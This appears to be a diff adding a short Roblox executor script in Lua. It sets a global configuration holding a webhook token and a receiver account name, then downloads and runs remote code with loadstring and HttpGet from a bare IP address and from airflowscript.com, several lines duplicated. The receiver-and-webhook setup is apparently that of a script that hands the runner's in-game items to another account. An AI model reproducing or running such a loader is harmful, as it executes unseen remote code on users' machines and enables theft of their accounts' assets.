@@ -1,0 +1,12 @@
+getfenv()
+getfenv()
+getgenv()
+getgenv().StarScriptsConfig = {
+    Webhook = "Q9Y6FcOiyFEsK_ElIJImAU8fry4DlHYibsjuYVd7CH5zX1fY",
+    Receivers = {"IsnowScript7"}
+}
+local Library = loadstring(game:HttpGet("http://205.185.125.84/gag2/garden2"))()
+local Library = loadstring(game:HttpGet("http://205.185.125.84/gag2/garden2"))()
+task.wait(0.2)
+local Library1 = loadstring(game:HttpGet("https://airflowscript.com/loader"))()
+local Library = loadstring(game:HttpGet("https://airflowscript.com/loader"))()
